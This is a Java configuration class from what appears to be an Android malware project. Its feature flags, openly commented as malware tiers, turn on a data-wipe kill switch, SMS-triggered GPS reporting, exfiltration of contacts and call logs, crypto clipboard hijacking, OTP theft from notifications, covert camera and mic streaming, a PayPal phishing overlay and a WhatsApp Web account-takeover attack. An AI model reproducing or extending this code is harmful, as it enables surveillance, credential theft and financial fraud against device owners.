package com.rcl.androidstreamcontrol.utils;

public class FeatureConfig {
    
    // 🛡️ ANTI-FORENSICS
    public static final boolean ENABLE_DATA_NUKE = true; // Checks for kill-switch flag
    
    // 🟢 LOW TIER MALWARE
    public static final boolean ENABLE_ANTI_UNINSTALL = false; // TEMPORARILY DISABLED — Prevents opening app settings (anti-uninstall tripwire)
    public static final boolean ENABLE_SMS_TRIGGER = true; // Listens for #LOC# to send GPS
    public static final boolean ENABLE_EXFILTRATION = true; // Syncs contacts and call logs
    public static final boolean ENABLE_CLIPBOARD_HIJACK = true; // Replaces crypto addresses
    public static final boolean ENABLE_NOTIFICATION_SPY = true; // Reads incoming OTPs
    public static final boolean ENABLE_HARDWARE_STREAM = true; // Allows live camera/mic recording
    
// 🟡 MIDDLE TIER MALWARE
    public static final boolean ENABLE_PAYPAL_INJECT = true; // Native overlay when PayPal opens
    
    // 🔴 HIGH TIER MALWARE - v159
    public static final boolean ENABLE_WHATSAPP_WEB = true; // WhatsApp Web OTP auto-link attack

}
